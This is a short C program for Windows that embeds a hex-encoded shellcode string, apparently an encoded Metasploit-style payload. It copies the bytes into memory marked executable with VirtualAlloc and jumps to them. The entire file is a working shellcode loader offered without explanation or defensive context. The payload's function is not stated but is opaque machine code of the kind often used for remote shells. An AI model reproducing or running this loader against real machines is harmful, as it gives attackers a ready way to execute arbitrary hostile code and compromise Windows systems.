#include <stdio.h>
#include <windows.h>



int main()
{

    char* shellcode = "\xb8\x5b\xd7\x34\xb4\xd9\xc4\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x56\x83\xea\xfc\x31\x42\x0f\x03\x42\x54\x35\xc1\x48\x82\x3b"
"\x2a\xb1\x52\x5c\xa2\x54\x63\x5c\xd0\x1d\xd3\x6c\x92\x70\xdf"
"\x07\xf6\x60\x54\x65\xdf\x87\xdd\xc0\x39\xa9\xde\x79\x79\xa8"
"\x5c\x80\xae\x0a\x5d\x4b\xa3\x4b\x9a\xb6\x4e\x19\x73\xbc\xfd"
"\x8e\xf0\x88\x3d\x24\x4a\x1c\x46\xd9\x1a\x1f\x67\x4c\x11\x46"
"\xa7\x6e\xf6\xf2\xee\x68\x1b\x3e\xb8\x03\xef\xb4\x3b\xc2\x3e"
"\x34\x97\x2b\x8f\xc7\xe9\x6c\x37\x38\x9c\x84\x44\xc5\xa7\x52"
"\x37\x11\x2d\x41\x9f\xd2\x95\xad\x1e\x36\x43\x25\x2c\xf3\x07"
"\x61\x30\x02\xcb\x19\x4c\x8f\xea\xcd\xc5\xcb\xc8\xc9\x8e\x88"
"\x71\x4b\x6a\x7e\x8d\x8b\xd5\xdf\x2b\xc7\xfb\x34\x46\x8a\x93"
"\xf9\x6b\x35\x63\x96\xfc\x46\x51\x39\x57\xc1\xd9\xb2\x71\x16"
"\x68\xd4\x81\xc8\xd2\xb5\x7f\xe9\x22\x9f\xbb\xbd\x72\xb7\x6a"
"\xbe\x19\x47\x92\x6b\xb7\x4d\x04\x54\xef\xc4\x21\x3c\xed\xe8"
"\xd8\xe1\x78\x0e\x8a\x49\x2a\x9f\x6b\x3a\x8a\x4f\x04\x50\x05"
"\xaf\x34\x5b\xcc\xd8\xdf\xb4\xb8\xb1\x77\x2c\xe1\x4a\xe9\xb1"
"\x3c\x37\x29\x39\xb4\xc7\xe4\xca\xbd\xdb\x11\xad\x3d\x24\xe2"
"\x58\x3d\x4e\xe6\xca\x6a\xe6\xe4\x2b\x5c\xa9\x17\x1e\xdf\xae"
"\xe8\xdf\xe9\xc5\xdf\x75\x55\xb2\x1f\x9a\x55\x42\x76\xf0\x55"
"\x2a\x2e\xa0\x06\x4f\x31\x7d\x3b\xdc\xa4\x7e\x6d\xb0\x6f\x17"
"\x93\xef\x58\xb8\x6c\xda\xda\xbf\x92\x98\xf4\x67\xfa\x62\x45"
"\x98\xfa\x08\x45\xc8\x92\xc7\x6a\xe7\x52\x27\xa1\xa0\xfa\xa2"
"\x24\x02\x9b\xb3\x6c\xc2\x05\xb3\x83\xdf\xb6\xce\xec\xe0\x37"
"\x2f\xe5\x84\x38\x2f\x09\xbb\x05\xf9\x30\xc9\x48\x39\x07\xc2"
"\xff\x1c\x2e\x49\xff\x33\x30\x58";

    printf("shellcode length: %i", strlen(shellcode));

    LPVOID lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpAlloc, shellcode, strlen(shellcode));

    ((void(*)())lpAlloc)();

    return 0;
}
